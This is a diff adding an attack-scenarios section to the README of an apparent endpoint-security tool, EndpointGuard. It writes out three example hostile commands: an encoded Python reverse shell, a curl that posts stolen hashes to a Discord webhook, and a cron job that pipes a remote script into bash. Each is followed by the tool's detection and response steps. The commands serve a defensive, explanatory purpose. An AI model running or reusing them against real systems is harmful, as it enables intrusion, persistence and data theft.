@@ -94,6 +94,58 @@ If yes, the sentinel identifies it as an active reverse shell. **Language, name,
 
 ---
 
+## 🎮 Simulated Intrusion & Autonomic Defense Scenarios
+
+To see EndpointGuard in action, here are three highly realistic attack scenarios showing how the sentinel automatically intercepts and neutralizes intrusions:
+
+### 🛑 Scenario 1: Obfuscated Python Reverse Shell
+* **The Attack**: An adversary executes a Base64-encoded Python one-liner to bypass standard command logging and establish a backdoor shell back to their listening host:
+  ```bash
+  python3 -c "import base64,sys;exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMS4xMDAiLDkwMDEpKTtvdyhkdXAyaW4sMCk7b3cuZHVwMm91dCwxKTtvdyhkdHAyZXJyLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFs...'))"
+  ```
+* **Traditional Security Failure**: Standard process monitoring logs a generic, legitimate `python3` process and ignores it since the command arguments do not contain flags like `/bin/bash` or `nc`.
+* **EndpointGuard Sentinel Defense**: 
+  1. The **File Descriptor Sentinel** walks `/proc` and inspects the active stream file descriptors (`fd/0`, `fd/1`, `fd/2`) of the Python PID.
+  2. It identifies that the streams are bound to an active network socket mapping to `192.168.1.100:9001` (external, non-whitelisted).
+  3. **Threat Score**: Calculates **50+** (Instant execution trigger).
+  4. **The Action**: 
+     - Kills the Python process and its parent shell wrapper processes.
+     - Severs the socket at the kernel layer using `ss -K dst 192.168.1.100`.
+     - Deploys an iptables drop rule banning the attacker's IP.
+     - Logs: `[EPG ALERT] [CRITICAL] Reverse shell detected! PID 14205 (python3) -> 192.168.1.100:9001. Action: Terminated process + dropped socket.`
+
+### 🛑 Scenario 2: Silent Webhook Exfiltration
+* **The Attack**: A dropper script located in a volatile system directory tries to read administrative hashes and POST them to an external Discord webhook:
+  ```bash
+  curl -H "Content-Type: application/json" -d '{"content": "Extracted Hashes: ..."}' https://discord.com/api/webhooks/12345/abcdef
+  ```
+* **Traditional Security Failure**: Default firewalls allow outbound HTTPS (port 443) traffic, letting the data slip out cleanly.
+* **EndpointGuard Sentinel Defense**:
+  1. The **Exfil & C2 Sweep Engine** scans `/tmp/` and detects the newly executed dropper payload.
+  2. It sweeps the file contents and finds strings matching a Discord Webhook URL.
+  3. **Threat Score**: Calculates **30+**.
+  4. **The Action**:
+     - The executing process is instantly terminated.
+     - The script is sandboxed in the secure quarantine directory with absolute read/write lockout (`chmod 000`).
+     - A Telegram security alert notification is dispatched to the admin immediately.
+
+### 🛑 Scenario 3: Trojanized Cronjob Persistence
+* **The Attack**: An attacker gains root access and leaves an hourly backdoor cronjob to pull down and run remote files:
+  ```text
+  0 * * * * root curl -s http://malicious.c2/drop.sh | bash
+  ```
+* **Traditional Security Failure**: Backdoors inside custom crontabs go completely unnoticed until a manual audit is performed.
+* **EndpointGuard Sentinel Defense**:
+  1. The **Deep Persistence Sweep** routinely audits all crontabs and system configuration profiles.
+  2. It identifies the un-whitelisted remote payload URL inside `/etc/cron.d/`.
+  3. **Threat Score**: Calculates **30+**.
+  4. **The Action**:
+     - Instantly cleanses the malicious line out of the cron configuration.
+     - Saves a secure pre-cleaned backup file: `/etc/cron.d/sysupdates.epg_pre_clean.<timestamp>`.
+     - Alerts the administrator via the Control Dashboard.
+
+---
+
 ## ⚡ Interactive TUI Control Console
 
 No configuration files to edit manually and no command line flags to memorize. Select a number in the polished terminal console to trigger sentinel actions:
